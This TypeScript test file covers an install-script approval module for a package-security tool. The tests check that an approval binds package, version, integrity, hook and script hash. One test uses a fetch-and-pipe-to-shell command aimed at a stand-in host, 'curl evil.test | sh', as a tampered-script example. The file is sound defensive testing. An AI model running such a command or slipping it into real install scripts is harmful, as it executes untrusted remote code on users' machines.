import { expect, test } from "bun:test";
import {
  type ApprovalFs,
  approvalPath,
  collectApprovals,
  describeMismatch,
  findApproval,
  hashScript,
  readApprovals,
  recordApproval,
  type ScriptApproval,
} from "../../src/graph/approvals.ts";

const SCRIPT = "node install.js";

function approval(over: Partial<ScriptApproval> = {}): ScriptApproval {
  return {
    schema_version: 1,
    package: "esbuild",
    version: "0.25.8",
    integrity: "sha512-esbuild",
    hook: "postinstall",
    script_hash: hashScript(SCRIPT),
    scope: "repo",
    approved_at: "2026-01-01T00:00:00.000Z",
    ...over,
  };
}

const request = (over: Partial<Parameters<typeof findApproval>[1]> = {}) => ({
  package: "esbuild",
  version: "0.25.8",
  integrity: "sha512-esbuild",
  hook: "postinstall",
  script: SCRIPT,
  ...over,
});

function fsWith(files: Record<string, string>): ApprovalFs & { files: Record<string, string> } {
  return {
    files,
    exists: (path) => path in files,
    readFile: (path) => {
      if (!(path in files)) throw new Error(`ENOENT ${path}`);
      return files[path] as string;
    },
    writeFile: (path, data) => {
      files[path] = data;
    },
    mkdir: () => undefined,
  };
}

test("the same script body always hashes the same way, ignoring surrounding whitespace", () => {
  expect(hashScript(SCRIPT)).toBe(hashScript(`  ${SCRIPT}\n`));
  expect(hashScript(SCRIPT)).toStartWith("sha256:");
});

test("a different script body hashes differently, which is the whole point", () => {
  expect(hashScript(SCRIPT)).not.toBe(hashScript("node install.js && curl evil.test | sh"));
});

test("an exact match on every bound field approves", () => {
  expect(findApproval([approval()], request())).toBeDefined();
});

const MISMATCHES: Array<[string, Record<string, string>]> = [
  ["a different version", { version: "0.25.9" }],
  ["a different integrity", { integrity: "sha512-other" }],
  ["a different hook", { hook: "preinstall" }],
  ["a different script body", { script: "node evil.js" }],
  ["a different package", { package: "other" }],
];

for (const [label, over] of MISMATCHES) {
  test(`${label} is not covered by the approval`, () => {
    expect(findApproval([approval()], request(over))).toBeUndefined();
  });
}

test("an empty approval list approves nothing", () => {
  expect(findApproval([], request())).toBeUndefined();
});

test("a version bump explains itself rather than silently failing", () => {
  expect(describeMismatch([approval()], request({ version: "0.25.9" }))).toContain(
    "approved for 0.25.8",
  );
});

test("a changed tarball for an approved version is named as the reason", () => {
  expect(describeMismatch([approval()], request({ integrity: "sha512-swapped" }))).toContain(
    "integrity changed",
  );
});

test("a changed script body for an approved version is named as the reason", () => {
  expect(describeMismatch([approval()], request({ script: "node evil.js" }))).toContain(
    "script body changed",
  );
});

test("a package with no approval at all has nothing to explain", () => {
  expect(describeMismatch([], request())).toBeNull();
  expect(describeMismatch([approval()], request())).toBeNull();
});

test("approvals are read from disk and survive a round trip", () => {
  const fs = fsWith({});
  const path = "/repo/.warden/approvals.json";
  recordApproval(fs, path, approval());
  expect(readApprovals(fs, path)).toHaveLength(1);
  expect(findApproval(readApprovals(fs, path), request())).toBeDefined();
});

test("re-approving the same package and hook replaces rather than accumulates", () => {
  const fs = fsWith({});
  const path = "/repo/.warden/approvals.json";
  recordApproval(fs, path, approval());
  const stored = recordApproval(fs, path, approval({ integrity: "sha512-new" }));
  expect(stored).toHaveLength(1);
  expect(stored[0]?.integrity).toBe("sha512-new");
});

test("approving a different hook of the same package keeps both", () => {
  const fs = fsWith({});
  const path = "/repo/.warden/approvals.json";
  recordApproval(fs, path, approval());
  const stored = recordApproval(fs, path, approval({ hook: "preinstall" }));
  expect(stored).toHaveLength(2);
});

test("stored approvals are sorted so the file does not churn", () => {
  const fs = fsWith({});
  const path = "/repo/.warden/approvals.json";
  recordApproval(fs, path, approval({ package: "zod" }));
  const stored = recordApproval(fs, path, approval({ package: "acorn" }));
  expect(stored.map((entry) => entry.package)).toEqual(["acorn", "zod"]);
});

test("a missing or corrupt approvals file reads as no approvals, never as a wildcard", () => {
  expect(readApprovals(fsWith({}), "/repo/.warden/approvals.json")).toEqual([]);
  expect(readApprovals(fsWith({ "/a.json": "{not json" }), "/a.json")).toEqual([]);
  expect(
    readApprovals(fsWith({ "/a.json": JSON.stringify({ approvals: "all" }) }), "/a.json"),
  ).toEqual([]);
});

test("repo and user scopes live at different paths and are both consulted", () => {
  expect(approvalPath("repo", "/repo", "/home/u")).toContain("/repo/");
  expect(approvalPath("user", "/repo", "/home/u")).toContain("/home/u/");
  const fs = fsWith({
    [approvalPath("repo", "/repo", "/home/u")]: JSON.stringify({
      schema_version: 1,
      approvals: [approval()],
    }),
    [approvalPath("user", "/repo", "/home/u")]: JSON.stringify({
      schema_version: 1,
      approvals: [approval({ package: "sharp", scope: "user" })],
    }),
  });
  expect(collectApprovals(fs, "/repo", "/home/u")).toHaveLength(2);
});
